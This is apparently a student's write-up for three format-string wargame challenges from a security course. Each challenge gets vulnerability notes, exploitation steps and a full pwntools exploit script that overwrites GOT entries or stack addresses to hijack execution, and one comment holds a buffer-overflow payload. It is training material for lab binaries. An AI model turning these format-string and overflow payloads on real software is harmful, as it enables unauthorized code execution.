lots
===========================

General overview of problems faced
-------------------------------------
- Had to learn about format strings and why they're exploitable

List of vulnerabilities
--------------------
1. A user controlled buffer is passed directly to a printf function without a format being passed
2. The scanf function is used without specifying a max length therefore there a buffer overflow is possible

Steps to exploit the format string
------------------
1. Get the printed pointer and calculate the address for printed address + 2 bytes
2. Send the following input: send one 'A' for alignment, send the printed address in little endian format, followed by the (printed address + 2 bytes), followed by your format string. The buffer is located at the 7th argument so the format string should be as follows: "%21053x%7$n%61960x%8$n"

Script/Command used
------------------
``` python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from pwn import *

A = 'A'

def format_n(arg_num, to_write = 0):
    return "%{}x%{}$n".format(to_write, arg_num)

def main():
    target = "localhost"
    port = "7001"

    r = remote( target, port )

    l = r.recvline().strip()[-10:]

    target_pointer = int(l, 16)

    offset = 1

    stack_arg_num = 7

    payload = (A * offset
        + p32(target_pointer)
        + p32(target_pointer + 2)
        + format_n(stack_arg_num, to_write=21053)
        + format_n(stack_arg_num + 1, to_write=61960)
    )

    r.sendline(payload)
    print r.recvrepeat()

def exp_2(): # buffer overflow
    # r <<< $(python -c 'print "A" * 512 + "FRND"')
    pass

if __name__ == '__main__':
    main()
```

==============================================
==============================================

formatrix
===========================

General overview of problems faced
-------------------------------------
- Had to learn about GOT and PLT table
- Had to do a full write using 4 addresses to find a way around the 1024 buffer size

List of vulnerabilities
--------------------
1. sprintf takes a buffer input without a format string therefore a user can provide a format string and exploit the vulnerability

Steps to exploit the format string
------------------
1. Get the win function address from the binary and the printf_got_address
2. Send the following input: printf_got_address + (printf_got_address + 1) + (printf_got_address + 2) + (printf_got_address + 3) + '%226x%3$n%159x%4$n%115x%5$n%260x%6$n'

Script/Command used
------------------
``` python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from pwn import *

def main():
    address = "localhost"
    port = 7002

    payload = ""

    offset = 12

    r = remote( address, port )

    to_overwrite = 0x804B4BC

    resp = r.recvrepeat(0.2)
    payload += p32( to_overwrite )
    payload += p32( to_overwrite + 1 )
    payload += p32( to_overwrite + 2 )
    payload += p32( to_overwrite + 3 )
    payload += '%226x%3$n%159x%4$n%115x%5$n%260x%6$n'

    r.sendline( payload )

    resp = r.recvrepeat(0.2)
    print resp

if __name__ == '__main__':
    main()

```

==============================================
==============================================

sploitwarz
===========================

General overview of problems faced
-------------------------------------
- Was writing the address in the wrong order
- learned about %hhn to overwrite 1 byte at a time without overflow

List of vulnerabilities
--------------------
1. The name buffer is used in a printf without formating after doing a successfull gamble

Steps to exploit the format string
------------------
1. Set your name to "%3$p"
2. Gamble and win. The odd one out is the non-fibonnaci number
3. Save the printed address and add 14172 to find the printf address in the got table. Remove -2883 to find the win function address
4. Set your name to : printf_address + (printf_address + 1) + (printf_address + 2) + (printf_address + 3) + '%76c%9$hhn%9c%10$hhn%240c%11$hhn%1c%12$hhn'
5. Gamble and win.

Script/Command used
------------------
``` python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from pwn import *

def get_fib_sequence():
    prev = 0
    curr = 1
    ret = [prev, curr]
    for i in range(1,25):
        temp = curr
        curr = prev+curr
        prev = temp
        ret += [curr]
    return ret

def get_wrong(l):
    fibs = get_fib_sequence()
    for i, dig in enumerate(l):
        if int(dig) not in fibs:
            return i
    return 0

def do_change_name(r, new_name):
    r.sendline('c')
    r.sendline(new_name)

def do_gamble(r):
    r.sendline('g')
    r.sendline('0.0000000001')
    r.recvuntil('Pick the odd one out:')
    resp = r.recvrepeat(0.2)
    resp = resp.split('\n')
    resp = [a[3:] for a in resp if a[3:]]

    print resp, get_wrong(resp)

    wrong = get_wrong(resp)
    r.sendline(str(wrong+1))
    r.recvuntil("Well done, ")
    resp = r.recvline()
    r.sendline()
    resp = resp.split('!')

    return resp[0]

def calculate_value(a, b):
    tmp = abs(a-b)
    if a > b:
        return 0x100-tmp
    return tmp

def main():
    # target = "wargames.6447.sec.edu.au"
    target = "localhost"
    port = "7003"

    r = remote( target, port )

    r.sendline('%3$p')
    resp = do_gamble(r)

    win = int(resp, 16) - 2883
    target = win + 14172
    win = hex(win)

    # Reversing because of little endian
    win = [int(win[i:i+2], 16) for i in range(2, len(win), 2)][::-1]

    payload = (
        p32(target)
        + p32(target + 1)
        + p32(target + 2)
        + p32(target + 3)
        + '%{}c%9$hhn%{}c%10$hhn%{}c%11$hhn%{}c%12$hhn'.format(
            win[0] - 16,
            calculate_value(win[0], win[1]),
            calculate_value(win[1], win[2]),
            calculate_value(win[2], win[3])
        )
    )

    do_change_name(r, payload)

    resp = r.recvrepeat(0.2)
    resp = do_gamble(r)
    print resp

if __name__ == '__main__':
    main()
```
